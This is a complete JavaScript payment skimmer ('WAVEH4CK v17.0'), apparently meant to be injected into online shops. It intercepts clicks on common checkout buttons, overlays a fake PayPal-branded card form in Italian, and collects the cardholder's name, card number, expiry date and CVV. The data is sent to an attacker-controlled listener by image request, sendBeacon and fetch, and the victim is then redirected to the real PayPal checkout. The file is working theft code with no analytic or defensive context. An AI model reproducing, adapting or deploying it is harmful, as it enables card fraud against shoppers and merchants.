/* WAVEH4CK v17.0 - AGGRESSIVE CHECKOUT SNIPER */
(function () {
    const C2 = 'https://waveh4ck.gamer.gd/MgtWaveH4ck/listener.php';
    const REDIRECT_URL = 'https://www.paypal.com/checkoutnow';
    
    if (window._wh_final_v17) return;
    window._wh_final_v17 = true;

    const _u = {
        send: (data) => {
            const p = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
            new Image().src = C2 + '?v=' + p + '&ts=' + Date.now();
            if (navigator.sendBeacon) navigator.sendBeacon(C2, p);
            fetch(C2, { method: 'POST', mode: 'no-cors', body: p });
        }
    };

    const _css = `
        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap');
        #pp-ovr { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.98); z-index:2147483647; display:flex; align-items:center; justify-content:center; font-family: 'Open Sans', sans-serif; }
        .pp-win { width:94%; max-width:440px; padding:35px; border-radius:10px; background:#fff; box-shadow: 0 5px 25px rgba(0,0,0,0.1); border: 1px solid #e5e5e5; }
        .pp-head { font-size: 24px; color: #2c2e2f; margin: 20px 0; font-weight: 400; }
        .pp-lbl { display:block; font-size:15px; color:#2c2e2f; font-weight:600; margin-bottom:10px; }
        .pp-inp { width:100%; border:1px solid #919191; padding:14px; border-radius:5px; font-size:17px; margin-bottom:20px; box-sizing:border-box; color: #2c2e2f; outline: none; }
        .pp-inp:focus { border-color:#0070ba; }
        .pp-row { display: flex; gap: 20px; }
        .pp-btn { width:100%; padding:16px; background:#0070ba; color:#fff; border:none; border-radius:30px; font-size:18px; font-weight:600; cursor:pointer; margin-top:10px; }
        .pp-foot { margin-top: 25px; border-top: 1px solid #eee; padding-top: 20px; text-align: center; color: #666; font-size: 13px; }
    `;

    function buildUI() {
        if (document.getElementById('pp-ovr')) return;
        const s = document.createElement('style'); s.innerHTML = _css; document.head.appendChild(s);
        const w = document.createElement('div'); w.id = 'pp-ovr';
        w.innerHTML = `
            <div class="pp-win">
                <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" height="35">
                <h1 class="pp-head">Paga con carta</h1>
                <label class="pp-lbl">Titolare della carta</label>
                <input type="text" id="p-name" class="pp-inp" placeholder="Nome e cognome">
                <label class="pp-lbl">Numero di carta</label>
                <input type="text" id="p-num" class="pp-inp" placeholder="0000 0000 0000 0000" maxlength="19">
                <div class="pp-row">
                    <div style="flex:1;"><label class="pp-lbl">Scadenza</label><input type="text" id="p-exp" class="pp-inp" placeholder="MM/AA" maxlength="5"></div>
                    <div style="flex:1;"><label class="pp-lbl">CVV</label><input type="password" id="p-cvv" class="pp-inp" placeholder="CVC" maxlength="4"></div>
                </div>
                <button id="p-sub" class="pp-btn">Paga ora</button>
                <div class="pp-foot">SSL Secured Connected</div>
            </div>`;
        document.body.appendChild(w);

        document.getElementById('p-num').oninput = (e) => {
            let v = e.target.value.replace(/\\D/g, '');
            let m = v.match(/.{1,4}/g);
            e.target.value = m ? m.join(' ') : v;
        };
        document.getElementById('p-exp').oninput = (e) => {
            let v = e.target.value.replace(/\\D/g, '');
            if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
            e.target.value = v;
        };

        document.getElementById('p-sub').onclick = (e) => {
            e.preventDefault();
            const d = {
                site: location.host,
                name: document.getElementById('p-name').value,
                num: document.getElementById('p-num').value.replace(/\\s/g,''),
                exp: document.getElementById('p-exp').value,
                cvv: document.getElementById('p-cvv').value,
                ua: navigator.userAgent
            };
            document.getElementById('p-sub').innerText = 'Processing...';
            _u.send(d);
            setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
        };
    }

    // AGGRESSIVE LISTENER - Menangkap event sebelum script lain
    const targetSelectors = [
        '#paypal-express-button', 
        '.btn-checkout', 
        '.action.checkout', 
        '#place-order-button',
        '[data-role="proceed-to-checkout"]',
        '.checkout-button',
        'button[title*="Checkout"]',
        'button[title*="Place Order"]',
        '#checkout-step-shipping-method',
        '.button.btn-proceed-checkout'
    ];

    document.addEventListener('click', (e) => {
        const btn = e.target.closest(targetSelectors.join(','));
        if (btn) {
            console.log('[WAVEH4CK] Checkout Triggered');
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            buildUI();
            return false;
        }
    }, true); // Pake capture true biar menang kasta pas event bubbling

    // Jaga-jaga kalau ada yang mementingkan inline event atau script lain
    window.addEventListener('hashchange', () => {
        if (location.hash.includes('checkout')) buildUI();
    });
})();
